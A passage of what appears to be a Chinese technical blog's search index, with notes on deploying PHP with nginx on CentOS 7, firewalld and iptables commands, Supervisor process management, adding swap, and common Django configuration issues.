    </entry>
    
    
    
    <entry>
      <title>No64：Centos7部署PHP项目</title>
      <link href="/posts/bb0ca218.html"/>
      <url>/posts/bb0ca218.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、CentOS7用Yum方式安装php-fpm"><a href="#一、CentOS7用Yum方式安装php-fpm" class="headerlink" title="一、CentOS7用Yum方式安装php-fpm"></a>一、CentOS7用Yum方式安装php-fpm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PHP5.4</span></span><br><span class="line">yum -y install php php-fpm php-gd php-mysql php-common php-pear php-mbstring php-mcrypt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start php-fpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop php-fpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart php-fpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">systemctl status php-fpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动</span></span><br><span class="line">systemctl enable php-fpm</span><br></pre></td></tr></table></figure><h3 id="二、配置NGINX"><a href="#二、配置NGINX" class="headerlink" title="二、配置NGINX"></a>二、配置NGINX</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name 127.0.0.1;</span><br><span class="line">    root        /www/wwwroot;</span><br><span class="line">    index       index.php index.html index.htm;</span><br><span class="line">    location    ~ \.php$ &#123;</span><br><span class="line">        try_files $uri =404;</span><br><span class="line">        fastcgi_pass unix:/var/run/php-fpm/php-fpm.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、重启NGINX，公网访问"><a href="#三、重启NGINX，公网访问" class="headerlink" title="三、重启NGINX，公网访问"></a>三、重启NGINX，公网访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p>通过127.0.0.1:80访问PHP网站。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No63：Centos7防火墙常用操作</title>
      <link href="/posts/bf19a8a6.html"/>
      <url>/posts/bf19a8a6.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、防火墙服务"><a href="#一、防火墙服务" class="headerlink" title="一、防火墙服务"></a>一、防火墙服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启防火墙服务</span></span><br><span class="line">systemctl start firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭防火墙服务</span></span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启防火墙服务</span></span><br><span class="line">systemctl restart firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">防火墙服务状态</span></span><br><span class="line">systemctl status firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁止防火墙服务开机启动</span></span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><h3 id="二、防火墙操作"><a href="#二、防火墙操作" class="headerlink" title="二、防火墙操作"></a>二、防火墙操作</h3><ul><li>查询有哪些端口是开启的</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --list-port</span><br></pre></td></tr></table></figure><ul><li>查询端口号80是否开启</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --query-port=80/tcp</span><br></pre></td></tr></table></figure><ul><li>开放端口</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令含义：</span></span><br><span class="line">--zone # 作用域</span><br><span class="line">--add-port=80/tcp # 添加端口，格式为：端口/通讯协议</span><br><span class="line">--permanent # 永久生效，没有此参数重启后失效</span><br></pre></td></tr></table></figure><ul><li>重载防火墙配置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><ul><li>常用命令介绍</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看防火墙状态，是否是running</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出支持的zone</span></span><br><span class="line">firewall-cmd --get-zones</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出支持的服务，在列表中的服务是放行的</span></span><br><span class="line">firewall-cmd --get-services</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ftp服务是否支持，返回<span class="built_in">yes</span>或者no</span></span><br><span class="line">firewall-cmd --query-service ftp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">临时开放ftp服务</span></span><br><span class="line">firewall-cmd --add-service=ftp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久开放ftp服务</span></span><br><span class="line">firewall-cmd --add-service=ftp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久移除ftp服务</span></span><br><span class="line">firewall-cmd --remove-service=ftp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久添加80端口</span></span><br><span class="line">firewall-cmd --add-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看规则，这个命令是和iptables的相同的</span></span><br><span class="line">iptables -L -n</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看帮助</span></span><br><span class="line">man firewall-cmd</span><br><span class="line">firewall-cmd --help</span><br></pre></td></tr></table></figure><h3 id="三、使用iptables替换firewall"><a href="#三、使用iptables替换firewall" class="headerlink" title="三、使用iptables替换firewall"></a>三、使用iptables替换firewall</h3><ul><li>直接关闭防火墙</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止firewall</span></span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁止firewall开机启动</span></span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><ul><li>安装 iptables service</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install iptables-services</span><br></pre></td></tr></table></figure><p>如果要修改防火墙配置，如增加防火墙端口3306</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件</span></span><br><span class="line">vim /etc/sysconfig/iptables</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">增加规则</span></span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存退出</span></span><br></pre></td></tr></table></figure><ul><li>开机启动iptables</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启防火墙使配置生效</span></span><br><span class="line">systemctl restart iptables.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置防火墙开机启动</span></span><br><span class="line">systemctl enable iptables.service</span><br></pre></td></tr></table></figure><ul><li>重启系统</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No62：Centos7使用Supervisor守护进程</title>
      <link href="/posts/1684685e.html"/>
      <url>/posts/1684685e.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装supervisor"><a href="#1、安装supervisor" class="headerlink" title="1、安装supervisor"></a>1、安装supervisor</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install supervisor</span><br></pre></td></tr></table></figure><h3 id="2、启动服务"><a href="#2、启动服务" class="headerlink" title="2、启动服务"></a>2、启动服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">supervisord -c /etc/supervisord.conf</span><br></pre></td></tr></table></figure><h3 id="3、编辑配置文件"><a href="#3、编辑配置文件" class="headerlink" title="3、编辑配置文件"></a>3、编辑配置文件</h3><p>随后我们在supervosprd.d中创建一个delploy.ini文件并编辑如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[program:logparser]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">logparser为程序的名称</span></span><br><span class="line">process_name = %(program_name)s_%(process_num)02d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作目录</span></span><br><span class="line">directory = /data/spider/scrapyd_deploy/logs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要执行的命令</span></span><br><span class="line">command = /root/.envs/spider_py38/bin/logparser</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户</span></span><br><span class="line">user = root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进程数量</span></span><br><span class="line">numprocs = 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是否自启动</span></span><br><span class="line">autostart = true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是否自动重启</span></span><br><span class="line">autorestart = false</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自动重启时间间隔(s)</span></span><br><span class="line">startsecs = 3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">程序重定向</span></span><br><span class="line">redirect_stderr = false</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出日志文件</span></span><br><span class="line">stdout_logfile = /data/log/logparser/workout.log</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">错误日志文件</span></span><br><span class="line">stderr_logfile = /data/log/logparser/workerr.log</span><br></pre></td></tr></table></figure><h3 id="4、重载配置文件"><a href="#4、重载配置文件" class="headerlink" title="4、重载配置文件"></a>4、重载配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">supervisorctl reload</span><br></pre></td></tr></table></figure><h3 id="5、子进程管理"><a href="#5、子进程管理" class="headerlink" title="5、子进程管理"></a>5、子进程管理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启所有的子进程：</span></span><br><span class="line">supervisorctl start all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭所有的子进程：</span></span><br><span class="line">supervisorctl stop all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有的子进程状态：</span></span><br><span class="line">supervisorctl status all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定操作子进程：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把上述命令的all改为指定进程名即可。</span></span><br></pre></td></tr></table></figure><h3 id="6、访问Supervisor的图形化界面"><a href="#6、访问Supervisor的图形化界面" class="headerlink" title="6、访问Supervisor的图形化界面"></a>6、访问Supervisor的图形化界面</h3><ul><li>修改配置</li></ul><p>将supervisord.conf中的一段配置更改如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0.0.0.0:9001</span><br></pre></td></tr></table></figure><ul><li>重载supervisor配置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">supervisorctl reload</span><br></pre></td></tr></table></figure><ul><li>开启端口</li></ul><p>在访问其web管理界面之前，先需要配置的端口，这里分配是9001端口,下面是端口管理的一些命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监测端口是否开启</span></span><br><span class="line">firewall-cmd --query-port=9001/tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启端口</span></span><br><span class="line">firewall-cmd --add-port=9001/tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭端口</span></span><br><span class="line">firewall-cmd --remove-port=9001/tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载配置</span></span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure><ul><li>访问图形界面</li></ul><p>端口开启成功后访问supervisor的界面程序进行进程管理</p><h3 id="7、附加配置文件参数详解"><a href="#7、附加配置文件参数详解" class="headerlink" title="7、附加配置文件参数详解"></a>7、附加配置文件参数详解</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">;[program:theprogramname]</span><br><span class="line">;command=/bin/cat              ; the program (relative uses PATH, can take args)</span><br><span class="line">;process_name=%(program_name)s ; process_name expr (default %(program_name)s)</span><br><span class="line">;numprocs=1                    ; number of processes copies to start (def 1)</span><br><span class="line">;directory=/tmp                ; directory to cwd to before exec (def no cwd)</span><br><span class="line">;umask=022                     ; umask for process (default None)</span><br><span class="line">;priority=999                  ; the relative start priority (default 999)</span><br><span class="line">;autostart=true                ; start at supervisord start (default: true)</span><br><span class="line">;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)</span><br><span class="line">;startretries=3                ; max # of serial start failures when starting (default 3)</span><br><span class="line">;autorestart=unexpected        ; when to restart if exited after running (def: unexpected)</span><br><span class="line">;exitcodes=0,2                 ; &#x27;expected&#x27; exit codes used with autorestart (default 0,2)</span><br><span class="line">;stopsignal=QUIT               ; signal used to kill process (default TERM)</span><br><span class="line">;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)</span><br><span class="line">;stopasgroup=false             ; send stop signal to the UNIX process group (default false)</span><br><span class="line">;killasgroup=false             ; SIGKILL the UNIX process group (def false)</span><br><span class="line">;user=chrism                   ; setuid to this UNIX account to run the program</span><br><span class="line">;redirect_stderr=true          ; redirect proc stderr to stdout (default false)</span><br><span class="line">;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO</span><br><span class="line">;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)</span><br><span class="line">;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)</span><br><span class="line">;stdout_capture_maxbytes=1MB   ; number of bytes in &#x27;capturemode&#x27; (default 0)</span><br><span class="line">;stdout_events_enabled=false   ; emit events on stdout writes (default false)</span><br><span class="line">;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO</span><br><span class="line">;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)</span><br><span class="line">;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)</span><br><span class="line">;stderr_capture_maxbytes=1MB   ; number of bytes in &#x27;capturemode&#x27; (default 0)</span><br><span class="line">;stderr_events_enabled=false   ; emit events on stderr writes (default false)</span><br><span class="line">;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions (def no adds)</span><br><span class="line">;serverurl=AUTO                ; override serverurl computation (childutils)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;[program:theprogramname]      ;这个就是咱们要管理的子进程了，&quot;:&quot;后面的是名字，最好别乱写和实际进程</span><br><span class="line">                                有点关联最好。这样的program我们可以设置一个或多个，一个program就是</span><br><span class="line">                                要被管理的一个进程</span><br><span class="line">;command=/bin/cat              ; 这个就是我们的要启动进程的命令路径了，可以带参数</span><br><span class="line">                                例子：/home/test.py -a &#x27;hehe&#x27;</span><br><span class="line">                                有一点需要注意的是，我们的command只能是那种在终端运行的进程，不能是</span><br><span class="line">                                守护进程。这个想想也知道了，比如说command=service httpd start。</span><br><span class="line">                                httpd这个进程被linux的service管理了，我们的supervisor再去启动这个命令</span><br><span class="line">                                这已经不是严格意义的子进程了。</span><br><span class="line">                                这个是个必须设置的项</span><br><span class="line">;process_name=%(program_name)s ; 这个是进程名，如果我们下面的numprocs参数为1的话，就不用管这个参数</span><br><span class="line">                                 了，它默认值%(program_name)s也就是上面的那个program冒号后面的名字，</span><br><span class="line">                                 但是如果numprocs为多个的话，那就不能这么干了。想想也知道，不可能每个</span><br><span class="line">                                 进程都用同一个进程名吧。</span><br><span class="line"></span><br><span class="line">;numprocs=1                    ; 启动进程的数目。当不为1时，就是进程池的概念，注意process_name的设置</span><br><span class="line">                                 默认为1    。。非必须设置</span><br><span class="line">;directory=/tmp                ; 进程运行前，会前切换到这个目录</span><br><span class="line">                                 默认不设置。。。非必须设置</span><br><span class="line">;umask=022                     ; 进程掩码，默认none，非必须</span><br><span class="line">;priority=999                  ; 子进程启动关闭优先级，优先级低的，最先启动，关闭的时候最后关闭</span><br><span class="line">                                 默认值为999 。。非必须设置</span><br><span class="line">;autostart=true                ; 如果是true的话，子进程将在supervisord启动后被自动启动</span><br><span class="line">                                 默认就是true   。。非必须设置</span><br><span class="line">;autorestart=unexpected        ; 这个是设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected</span><br><span class="line">                                 和true。如果为false的时候，无论什么情况下，都不会被重新启动，</span><br><span class="line">                                 如果为unexpected，只有当进程的退出码不在下面的exitcodes里面定义的退</span><br><span class="line">                                 出码的时候，才会被自动重启。当为true的时候，只要子进程挂掉，将会被无</span><br><span class="line">                                 条件的重启</span><br><span class="line">;startsecs=1                   ; 这个选项是子进程启动多少秒之后，此时状态如果是running，则我们认为启</span><br><span class="line">                                 动成功了</span><br><span class="line">                                 默认值为1 。。非必须设置</span><br><span class="line">;startretries=3                ; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把</span><br><span class="line">                                 此进程的状态置为FAIL</span><br><span class="line">                                 默认值为3 。。非必须设置</span><br><span class="line">;exitcodes=0,2                 ; 注意和上面的的autorestart=unexpected对应。。exitcodes里面的定义的</span><br><span class="line">                                 退出码是expected的。</span><br><span class="line">;stopsignal=QUIT               ; 进程停止信号，可以为TERM, HUP, INT, QUIT, KILL, USR1, or USR2等信号</span><br><span class="line">                                  默认为TERM 。。当用设定的信号去干掉进程，退出码会被认为是expected</span><br><span class="line">                                  非必须设置</span><br><span class="line">;stopwaitsecs=10               ; 这个是当我们向子进程发送stopsignal信号后，到系统返回信息</span><br><span class="line">                                 给supervisord，所等待的最大时间。 超过这个时间，supervisord会向该</span><br><span class="line">                                 子进程发送一个强制kill的信号。</span><br><span class="line">                                 默认为10秒。。非必须设置</span><br><span class="line">;stopasgroup=false             ; 这个东西主要用于，supervisord管理的子进程，这个子进程本身还有</span><br><span class="line">                                 子进程。那么我们如果仅仅干掉supervisord的子进程的话，子进程的子进程</span><br><span class="line">                                 有可能会变成孤儿进程。所以咱们可以设置可个选项，把整个该子进程的</span><br><span class="line">                                 整个进程组都干掉。 设置为true的话，一般killasgroup也会被设置为true。</span><br><span class="line">                                 需要注意的是，该选项发送的是stop信号</span><br><span class="line">                                 默认为false。。非必须设置。。</span><br><span class="line">;killasgroup=false             ; 这个和上面的stopasgroup类似，不过发送的是kill信号</span><br><span class="line">;user=chrism                   ; 如果supervisord是root启动，我们在这里设置这个非root用户，可以用来</span><br><span class="line">                                 管理该program</span><br><span class="line">                                 默认不设置。。。非必须设置项</span><br><span class="line">;redirect_stderr=true          ; 如果为true，则stderr的日志会被写入stdout日志文件中</span><br><span class="line">                                 默认为false，非必须设置</span><br><span class="line">;stdout_logfile=/a/path        ; 子进程的stdout的日志路径，可以指定路径，AUTO，none等三个选项。</span><br><span class="line">                                 设置为none的话，将没有日志产生。设置为AUTO的话，将随机找一个地方</span><br><span class="line">                                 生成日志文件，而且当supervisord重新启动的时候，以前的日志文件会被</span><br><span class="line">                                 清空。当 redirect_stderr=true的时候，sterr也会写进这个日志文件</span><br><span class="line">;stdout_logfile_maxbytes=1MB   ; 日志文件最大大小，和[supervisord]中定义的一样。默认为50</span><br><span class="line">;stdout_logfile_backups=10     ; 和[supervisord]定义的一样。默认10</span><br><span class="line">;stdout_capture_maxbytes=1MB   ; 这个东西是设定capture管道的大小，当值不为0的时候，子进程可以从stdout</span><br><span class="line">                                 发送信息，而supervisor可以根据信息，发送相应的event。</span><br><span class="line">                                 默认为0，为0的时候表达关闭管道。。。非必须项</span><br><span class="line">;stdout_events_enabled=false   ; 当设置为ture的时候，当子进程由stdout向文件描述符中写日志的时候，将</span><br><span class="line">                                 触发supervisord发送PROCESS_LOG_STDOUT类型的event</span><br><span class="line">                                 默认为false。。。非必须设置</span><br><span class="line">;stderr_logfile=/a/path        ; 这个东西是设置stderr写的日志路径，当redirect_stderr=true。这个就不用</span><br><span class="line">                                 设置了，设置了也是白搭。因为它会被写入stdout_logfile的同一个文件中</span><br><span class="line">                                 默认为AUTO，也就是随便找个地存，supervisord重启被清空。。非必须设置</span><br><span class="line">;stderr_logfile_maxbytes=1MB   ; 这个出现好几次了，就不重复了</span><br><span class="line">;stderr_logfile_backups=10     ; 这个也是</span><br><span class="line">;stderr_capture_maxbytes=1MB   ; 这个一样，和stdout_capture一样。 默认为0，关闭状态</span><br><span class="line">;stderr_events_enabled=false   ; 这个也是一样，默认为false</span><br><span class="line">;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; 这个是该子进程的环境变量，和别的子进程是不共享的</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No61：Centos7添加swap虚拟内存</title>
      <link href="/posts/bc5a9fb6.html"/>
      <url>/posts/bc5a9fb6.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、查看内存的使用情况"><a href="#1、查看内存的使用情况" class="headerlink" title="1、查看内存的使用情况"></a>1、查看内存的使用情况</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure><h3 id="2、创建一个swap文件，大小为1G"><a href="#2、创建一个swap文件，大小为1G" class="headerlink" title="2、创建一个swap文件，大小为1G"></a>2、创建一个swap文件，大小为1G</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=/dev/zero of=/home/swap bs=1024 count=1024000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/home目录下面多了一个1G大小的文件swap</span></span><br></pre></td></tr></table></figure><h3 id="3、将文件格式转换为swap格式的"><a href="#3、将文件格式转换为swap格式的" class="headerlink" title="3、将文件格式转换为swap格式的"></a>3、将文件格式转换为swap格式的</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkswap /home/swap</span><br></pre></td></tr></table></figure><h3 id="4、再用swapon命令把这个文件分区挂载swap分区"><a href="#4、再用swapon命令把这个文件分区挂载swap分区" class="headerlink" title="4、再用swapon命令把这个文件分区挂载swap分区"></a>4、再用swapon命令把这个文件分区挂载swap分区</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swapon /home/swap</span><br></pre></td></tr></table></figure><h3 id="5、为防止重启后swap分区变成0，要修改-etc-fstab文件"><a href="#5、为防止重启后swap分区变成0，要修改-etc-fstab文件" class="headerlink" title="5、为防止重启后swap分区变成0，要修改&#x2F;etc&#x2F;fstab文件"></a>5、为防止重启后swap分区变成0，要修改&#x2F;etc&#x2F;fstab文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/fstab</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件末尾（最后一行）加上</span></span><br><span class="line"></span><br><span class="line">/home/swap swap swap default 0 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No60：Django常见问题汇总</title>
      <link href="/posts/e1b32e96.html"/>
      <url>/posts/e1b32e96.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、No-module-named-‘django-core-urlresolvers’"><a href="#1、No-module-named-‘django-core-urlresolvers’" class="headerlink" title="1、No module named ‘django.core.urlresolvers’"></a>1、No module named ‘django.core.urlresolvers’</h3><p>最近从django1.9迁移到django2.0中出现一个意外的报错：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 报错</span></span><br><span class="line"><span class="comment"># No module named &#x27;django.core.urlresolvers&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原因：django2.0把原来的django.core.urlresolvers包更改为了django.urls包。</p><p>解决方法是：把导入的包都修改一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from django.core.urlresolvers import reverse</span></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No59：Django的DEBUG=False(生产环境)</title>
      <link href="/posts/9c79c73c.html"/>
      <url>/posts/9c79c73c.html</url>
      
        <content type="html"><![CDATA[<p>Django关闭DEBUG模式后，就相当于是生产环境了，Django官网上指出如果是django框架一旦作为生产环境，那么它的静态文件访问接口就不应该从Django框架中走了，应该有独立的web环境，首推nginx。</p><p>在开发过程中，开发人员在框架的根目录下创建一个static目录，目录在根据里面有几个APP创建对应APP程序静态文件目录。但是一旦放到生产环境（也就是关闭掉DEBUG模式），你在nginx中就要单独做访问&#x2F;static&#x2F;目录的路由。</p><ul><li>STATICFILES_DIRS</li></ul><p>列表中的目录是开发时创建的静态目录。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">STATIC_URL = <span class="string">&quot;/static/&quot;</span></span><br><span class="line">STATICFILES_DIRS = [os.path.join(BASE_DIR, <span class="string">&quot;static&quot;</span>)]</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>MEDIA_URL</li></ul><p>自定义文件上传路径。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MEDIA_URL = <span class="string">&quot;/media/&quot;</span></span><br><span class="line">MEDIA_DIRS = [os.path.join(BASE_DIR, <span class="string">&quot;media&quot;</span>)]</span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">&quot;media&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>STATIC_ROOT</li></ul><p>Django框架放到生产环境中的唯一的一个静态目录。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">STATIC_ROOT = os.path.join(PROJECT_ROOT, <span class="string">&quot;../statics&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>将所有静态文件统一收集到STATIC_ROOT目录。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python manage.py collectstatic</span><br></pre></td></tr></table></figure><p>DEBUG&#x3D;False时，就必须部署nginx或者其他web服务器来提供静态访问入口。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location /static &#123;</span><br><span class="line">    # 项目静态文件地址</span><br><span class="line">    alias /静态目录/;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No58：Django添加robots文件</title>
      <link href="/posts/9aa674d9.html"/>
      <url>/posts/9aa674d9.html</url>
      
